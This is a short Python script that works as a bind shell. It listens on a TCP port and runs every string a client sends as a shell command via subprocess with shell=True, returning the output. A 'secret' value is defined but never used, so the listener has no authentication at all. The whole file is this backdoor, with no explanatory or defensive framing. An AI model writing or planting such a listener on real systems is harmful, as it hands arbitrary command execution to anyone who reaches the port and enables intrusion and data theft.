import socket,subprocess

host = "127.0.0.1"
port = 2000
secret = "123456789"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host,port))
sock.listen(100)
while 1:
    client , address = sock.accept()
    while 1:
        command = client.recv(1000)
        res = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        result = res.stdout.read() + res.stderr.read()
        client.send(result)
